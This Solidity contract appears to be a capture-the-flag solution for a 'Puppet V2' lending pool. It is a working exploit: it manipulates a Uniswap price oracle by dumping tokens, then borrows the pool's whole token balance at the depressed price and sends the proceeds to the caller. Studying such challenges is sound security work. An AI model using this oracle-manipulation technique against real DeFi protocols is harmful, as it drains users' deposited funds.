// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./PuppetV2Pool.sol";


interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

interface IERC20V2 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract PuppetV2Attacker {

    IUniswapV2Router router;
    IERC20V2 token;
    PuppetV2Pool pool;
    IWETH weth;

    constructor(address router_, address token_, address pool_, address weth_) public {
        router = IUniswapV2Router(router_);
        token = IERC20V2(token_);
        pool = PuppetV2Pool(pool_);
        weth = IWETH(weth_);
    }

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 deadline;
        bytes32 r;
        bytes32 s;
        uint8 v;
    }
    function attack(Permit calldata permit) external payable {
        // Approve pulling user tokens in order to execute attack
        token.permit(
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            permit.v,
            permit.r,
            permit.s
        );

        token.transferFrom(permit.owner, address(this), permit.value);
        // Approve exchange to pull tokens
        token.approve(address(router), permit.value);
        // Swap tokens for ETH in order to disbalance the pool
        address[] memory pair = new address[](2); // dinamic array
        address[2] memory pairv2 = [address(token),address(weth)]; // static array
        pair[0] = address(token);
        pair[1] = address(weth);
        router.swapExactTokensForETH(permit.value, 0, pair, address(this), permit.deadline);
        // FIXME wrap eth to weth
        weth.deposit{value: address(this).balance}();
        weth.approve(address(pool), weth.balanceOf(address(this)));
        // Borrow all the pool tokens as now the price is lower
        pool.borrow(token.balanceOf(address(pool)));
        weth.withdraw(weth.balanceOf(address(this)));
        // Send retrieved ether to user
        payable(msg.sender).transfer(address(this).balance);
        // Send borrowed tokens to user
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}